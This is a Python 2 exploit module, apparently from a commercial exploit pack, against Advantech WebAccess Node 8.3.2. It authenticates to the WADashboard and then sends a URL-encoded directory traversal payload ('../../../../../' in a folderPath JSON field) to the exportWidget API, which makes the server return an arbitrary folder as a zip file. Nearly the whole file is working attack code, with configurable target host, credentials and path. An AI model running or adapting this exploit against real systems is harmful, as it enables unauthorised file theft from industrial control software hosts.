from Sploit import Sploit
from collections import OrderedDict
import urllib
import urllib2
import cookielib
import os

INFO = {}
INFO['NAME'] = "efs_advantech_webaccess_afd"
INFO['DESCRIPTION'] = "Advantech WebAccess Node 8.3.2 Arbitrary Folder Download"
INFO['VENDOR'] = "http://www.advantech.com/"
INFO['CVE Name'] = ""
INFO['NOTES'] = """/WADashboard/api/dashboard/v1/mainframes/whateveryouwant/exportWidget?exportWidget={}
exportWidget= parameter accepts JSON formatted string [{"id":"","folderPath":""}].
It is possible to retrieve arbitrary folder once folderPath value is equals to ../../../../../{PATH}/
"""
INFO['DOWNLOAD_LINK'] = "http://support.advantech.com/support/DownloadSRDetail_New.aspx?Doc_Source=Download&SR_ID=1-MS9MJV"
INFO['LINKS'] = [""]
INFO['CHANGELOG'] = ""
INFO['PATH'] = "Exploits/General"
INFO['AUTHOR'] = "10 Oct 2018, Gleg Team"

OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.57", dict(description="Target host")
OPTIONS["LOGIN"] = "user", dict(description="Login")
OPTIONS["PASSWORD"] = "user", dict(description="Password")
OPTIONS["OUTPUT_PATH"] = "c:/Users/User/Desktop/results", dict(description="A folder to put downloaded stuff into")
OPTIONS["TARGET_PATH"] = "test", dict(description="Path to desired folder on target machine")
OPTIONS["SSL"] = False, dict(description="Use HTTPS")

class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)

        self.login = 'user'
        self.password = 'user'
        self.host = '192.168.1.57'
        self.output_path = "c:/Users/User/Desktop/results"
        self.protocol = 'http'
        self.target_path = ""

        self.dashboard_port = 8081

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", self.host)
        self.login = self.args.get("LOGIN", self.login)
        self.password = self.args.get("PASSWORD", self.password)
        self.output_path = self.args.get("OUTPUT_PATH", self.output_path)
        self.target_path = self.args.get("TARGET_PATH", self.target_path)

        self.protocol = 'https' if self.args.get("SSL") else 'http'

        if self.target_path == "":
            self.log("Please set target path")
            self.finish(False)

        urllib2.install_opener(
            urllib2.build_opener(
                urllib2.HTTPCookieProcessor(
                    cookielib.CookieJar()
                )
            )
        )

        x = 0
        if ':' in self.target_path:
            x = self.target_path.index(':') + 1
        self.target_path = self.target_path[x:].strip('\\/')

    def authorize(self):
        url = "{}://{}:{}/WADashboard/login?cont=dashboardViewer".format(self.protocol, self.host, self.dashboard_port)
        data = {
            "projectName1": "1",  # could be any but not empty
            "username": "%s" % self.login,
            "password": "%s" % self.password,
            "recId": ""
        }
        data = urllib.urlencode(data)
        req = urllib2.Request(url=url, data=data)
        try:
            r = urllib2.urlopen(req)
            if not r.getcode() == 200:
                self.log("[-] Failed to authorize. Check your login/password or try another")
                self.finish(False)
            else:
                if "<title>Dashboard Viewer</title>" not in r.read():
                    self.log("[-] Failed to authorize. Check your login/password or try another")
                    self.finish(False)
                else:
                    self.log("[+] Successfully authorized")
        except Exception as ex:
            self.log("[-] Authorization failed: failed to send request\r\n%s" % ex)
            self.finish(False)

    def get_folder(self):
        folder_json = "%5B%7B%22id%22%3A%22W_ACL_ACTION_LOG_1%22%2C%22folderPath%22%3A%22../../../../../{PATH}%2F%22%7D%5D".replace('{PATH}', self.target_path)
        folder_json = folder_json.replace('.', '%2E').replace('/', '%2F')

        url = "{}://{}:{}/WADashboard/api/dashboard/v1/mainframes/whateveryouwant/exportWidget?".format(self.protocol, self.host, self.dashboard_port)
        url += "zipFileName=&exportWidget={}&releaseVersion=2.0.31".format(folder_json)

        try:
            r = urllib2.urlopen(url)
            if r.getcode() == 200:
                self.log('[+] Request succeeded')
        except Exception as ex:
            self.log('[-] Request failed\r\n%s' % ex)
            self.finish(False)

        with open(self.output_path + "/result.zip", 'wb') as f:
            f.write(r.read())

    def run(self):

        self.args()
        self.log('Starting')

        if not os.path.exists(self.output_path):
            os.makedirs(self.output_path)

        self.authorize()
        self.get_folder()
        self.log('[+] Download finished. Check %s' % self.output_path)
        self.finish(True)


if __name__ == '__main__':
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()